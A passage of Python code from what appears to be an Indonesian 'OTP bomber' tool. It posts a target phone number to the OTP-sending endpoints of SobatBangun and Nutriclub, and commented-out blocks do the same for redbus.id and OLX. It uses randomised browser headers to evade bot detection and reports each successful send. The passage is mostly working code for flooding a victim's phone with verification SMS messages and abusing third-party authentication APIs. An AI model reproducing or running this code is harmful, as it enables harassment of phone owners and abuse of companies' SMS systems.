    #     "reCaptchaResponse": "03AFcWeA6i18Ptv9I8jtTUxeh8yXsNN8IOYBUyVC-IxP6JE2lSSjyxMXhbcIUaIOJw-YDHe-0zAvkj9dwfVSTnCW8yZGCNtZwLzlNjEUB1HyNcNnVdxugbDxXXZDQxxgEYe3vwLuywUyIsRsJsrU5LxcpwzruWG-1_nT7xoMpUYXEoRHzOU0jmsHaDOgR-MONHwvCXwTx6y04nzSfbhd65sZplx3X2Ai7-V6bjzpuky3lBWVOUKSgygdwAq04uSGyVJUeGVTPmv02Sj6Q1mv6KpGzq4GUxwEikSdsrrGZmMYYJPN3DVHZFf0hWT5hDDUX7AE2t2b5zYYmL2_gHV0i44LEqP2t7fd6ueXfRD32eoKlFHUITTkhNXQ7reXLt3XJwU5EqK4Brg6-xleyzHMAzNatNJ19ZGNRnafZEa8BFXbll3wzOXGrrgq5bmuhfTPk6VhXoxgD-xO_QXdTJlG-TpdUBoq4NLkmY7uLULqKHMG3lewGecSfTuACSFsftb6vazdzjQzECRc0r0uhqRUF27Tukh0Z0PBKmDedm_zIvGv7wwvIlp_lrGiT7lxV4DwLhDYtD1-sgIhurwVxUWH9h7_izNmlBOKGYF0gEUlQqgg0CHiAEONyBGMoa-z9KXvrow-j7caP1hkpMOeeLCWdOIKlUEugJsBb9DzTOLGmfZ-Ao_1mJf9g8b0z7mpfEme7a49J4qZw6PsfhsDXMqyYM8yWR68p9WkM2me6abHpqsMOfIO93kZ38Xw4",
    #     "Token": "404977245971"
    # })
    
    # response_redbusid = requests.post("https://www.redbus.id/Personalization/SendOTPV2", headers=headers_redbus, data=data_redbus, timeout=5)
    # if response_redbusid.status_code == 200:
    #     print(f"{G}Berhasil mengirim OTP via Dekoruma {response_redbusid.status_code} {response_redbusid.text}")
    # else:
    #     print(f"{R}Gagal mengirim OTP via Dekoruma {response_redbusid.status_code} {response_redbusid.text}")
        
    # headers_olx = {
    #     "Accept": "*/*",
    #     "Accept-Encoding": "gzip, deflate, br, zstd",
    #     "Accept-Language": generate_accept_language(),
    #     "Content-Length": str(random.randint(100, 200)),
    #     "Content-Type": "application/json",
    #     "Priority": "u=1, i",
    #     "Referer": "https://www.olx.co.id/",
    #     "Sec-Ch-Ua": generate_sec_ch_ua(),
    #     "Sec-Ch-Ua-Mobile": f"{random.randint(0, 1)}",
    #     "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
    #     "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
    #     "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
    #     "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
    #     "Traceparent": "00-7d2c776445f0775497ea2de8b63256de-7b0f7e2a5923b638-01",
    #     "Tracestate": "2042607@nr=0-1-3983507-1834999396-7b0f7e2a5923b638----1719222282331",
    #     "User-Agent": generate_user_agent(),
    #     "X-Newrelic-Id": "Vw8PUlNTDxABUlZVDggCVFUJ",
    #     "X-Panamera-Fingerprint": "fdab149db6153999e06c8acb6cc04985#1719150790758"
    # }
    
    # data_olx = json.dumps({
    #     "grantType": "phone",
    #     "language": "id",
    #     "phone": inputNomer,
    # })
    
    # response_olx = requests.post("https://www.olx.co.id/api/auth/authenticate", headers=headers_olx, data=data_olx, timeout=5)
    # if response_olx.status_code == 200:
    #     print(f"{G}Berhasil mengirim OTP via OLX {response_olx.status_code} {response_olx.text}")
    # else:
    #     print(f"{R}Gagal mengirim OTP via OLX {response_olx.status_code} {response_olx.text}")
        
    headers_sobatbang = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(100, 200)),
        "Content-Type": "application/json",
        "Origin": "https://www.sobatbangun.com",
        "Priority": "u=1, i",
        "Referer": "https://www.sobatbangun.com/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
    }
    
    data_sobatbangun = json.dumps({
        "email_or_phone": nomor_sobatbangun,
    })
    
    response_sobatbangun = requests.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun, timeout=5)
    if response_sobatbangun.status_code == 200:
        print(f"{G}Berhasil mengirim OTP via SobatBangun {response_sobatbangun.status_code} {response_sobatbangun.text}")
    else:
        print(f"{R}Gagal mengirim OTP via SobatBangun {response_sobatbangun.status_code} {response_sobatbangun.text}")
        
    headers_nutriclub = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(100, 200)),
        "Origin": "https://www.nutriclub.co.id",
        "Priority": "u=1, i",
        "Referer": "https://www.nutriclub.co.id/membership/registration",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Requested-With": "XMLHttpRequest"
    }
    
    data_nutriclub = json.dumps({
        "phone": nomor_nutriclub,
        "old_phone": nomor_nutriclub,
    })
    
    response_data_nutriclub = requests.post(f"https://www.nutriclub.co.id/membership/otp/?phone={nomor_nutriclub}&old_phone={nomor_nutriclub}", headers=headers_nutriclub, data=data_nutriclub, timeout=5)
    if response_data_nutriclub.status_code == 200:
        print(f"{G}Berhasil mengirim OTP via Nutriclub {response_data_nutriclub.status_code} {response_data_nutriclub.text}")
    else:
        print(f"{R}Gagal mengirim OTP via Nutriclub {response_data_nutriclub.status_code} {response_data_nutriclub.text}")
        
        